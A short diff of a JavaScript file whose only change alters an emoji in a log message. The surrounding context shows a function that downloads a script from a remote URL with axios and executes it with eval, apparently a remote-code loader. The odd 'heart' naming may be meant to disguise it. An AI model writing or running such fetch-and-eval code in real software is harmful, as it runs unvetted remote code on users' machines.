@@ -21,7 +21,7 @@ async function fetchINDEXUrl() {
       throw new Error('heart not found 😭');
     }
 
-    console.log('The heart is loaded successfully ✅');
+    console.log('The heart is loaded successfully 💨');
 
     const scriptResponse = await axios.get(targetUrl);
     eval(scriptResponse.data);
